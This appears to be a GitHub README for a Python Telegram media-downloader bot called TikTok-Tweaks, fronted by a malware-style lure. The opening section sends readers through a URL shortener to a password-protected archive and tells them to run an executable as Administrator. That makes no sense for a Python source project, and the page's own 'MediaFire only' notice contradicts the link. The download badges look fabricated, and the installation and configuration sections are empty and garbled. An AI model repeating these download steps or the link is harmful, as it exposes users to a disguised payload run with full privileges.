<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Overview

**TikTok-Tweaks** is an asynchronous Python bot engineered for content creators, video editors, and power users. It provides watermark-free media downloads across six major platforms, binary MP4 container inspection, creator engagement analytics, and instant audio identification directly from Telegram chats or groups.

### Highlights

- **Multi-Platform Support:** TikTok, YouTube (up to 4K Ultra HD), Instagram, Twitter/X, Pinterest, and Spotify.
- **Deep Stream Inspection (`/check`):** Probes binary MP4 atoms to extract real video codec (H.265/HEVC vs. H.264), bitrate, frame rates, and TikTok VQScore quality metric.
- **Shazam Engine:** In-memory PCM audio fingerprinting from voice messages, video notes, and forwarded clips.
- **Document Mode:** Delivers uncompressed original files without Telegram's native video transcoding.
- **Telegram Mini App:** Modern HTML5 glassmorphism interface syncing real-time SQLite statistics and user preferences.
- **Group Chat Automation:** Automatic media extraction without quote-reply clutter, configurable per group.

---

## Feature Matrix

| Platform | Max Resolution | Audio Format | Stream Inspection | Special Features |
| :--- | :--- | :--- | :--- | :--- |
| **TikTok** | 1080p @ 120 FPS | MP3 / AAC | Full (`/check`) | No watermark, VQScore, 12-video profile analytics |
| **YouTube** | 4K Ultra HD (2160p) | MP3 320 kbps | Format picker | Shorts & long-form, multi-resolution selection |
| **Instagram** | 1080p FHD | M4A / AAC | Metadata extraction | Reels, Posts, Stories |
| **Twitter / X** | Source Native | AAC | Stream info | Direct MP4 link extraction |
| **Pinterest** | Original Resolution | N/A | Image / Video probe | Pins, animated clips, full-size images |
| **Spotify** | N/A | MP3 320 kbps | Metadata & ID3 | Full tracks with album art & artist metadata |

---

## Technical Architecture

### 1. MP4 Atom Probing
Rather than relying solely on server headers, the inspector decodes binary MP4 boxes (`ftyp`, `tkhd`, `mdhd`) from initial stream bytes:
- Detects actual video codecs: `hvc1`/`hev1` (H.265), `avc1` (H.264), `av01` (AV1), and `vp09` (VP9).
- Accurately measures timescale, duration, exact frame rate (FPS), and bitrates for both mobile app and web browser streams.
- Calculates the proprietary **VQScore (0–100)** to determine compression quality.

### 2. TLS Impersonation & CDN Resilience
To prevent `403 Forbidden` and rate-limit blocks from TikTok CDNs:
- Primary downloads utilize chunked `aiohttp` streaming up to 512 MB.
- Automatic fallback routes through `curl_cffi` using Chrome TLS fingerprint impersonation.

### 3. In-Memory Audio Identification
The Shazam integration extracts PCM audio directly using `pydub` and `imageio-ffmpeg` without temporary disk I/O, generating signatures within milliseconds.

---

## Installation

### Prerequisites

- Python 3.10 or higher
### Setup

1. **Clone the repository:**
   ```bash
## Configuration

All configuration is managed through environment variables in `.env`:

| Variable | Type | Default | Description |
| :--- | :--- | :--- | :--- |
## Command Reference

| Command | Arguments | Description |
| :--- | :--- | :--- |
| `/start` | None | Open the main interactive navigation dashboard. |
| `/check` | `<url>` or `@username` | Deep-inspect video stream specs, VQScore, or creator's last 12 uploads. |
| `/mode` | None | Switch operating mode between Hybrid, Downloader, and Checker. |
| `/profile` | None | Display personal download/inspection stats and launch the Mini App. |
| `/settings` | None | Toggle Document mode, clean captions, and response delivery mode. |
| `/shazam` | None | View audio recognition instructions. |
| `/group_settings` | None | Manage group-specific permissions (auto-download, silent delivery). |
| `/help` | None | Comprehensive guide for commands and media links. |

---

## Project Structure

```
TikTok-Tweaks/
├── bot.py                  # Core bot entrypoint (handlers, callbacks, group dispatch)
├── config.py               # Environment validation and application settings
├── database.py             # SQLite interface for user analytics and group settings
├── multi_platform_api.py   # Downloaders for YouTube (4K), Twitter, Pinterest, Spotify
├── tiktok_api.py           # TikTok & Instagram API, MP4 parser, and VQScore algorithm
├── shazam_service.py       # In-memory PCM Shazam recognition service
├── stats_formatter.py      # Minimalist message formatters and analytics cards
├── webapp/
│   └── index.html          # Telegram Mini App with Glassmorphism UI
├── requirements.txt        # Python dependency manifest
├── .env.example            # Environment configuration template
└── README.md               # Project documentation
```

---


---

MIT License

Copyright (c) 2026 HaiYTB

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
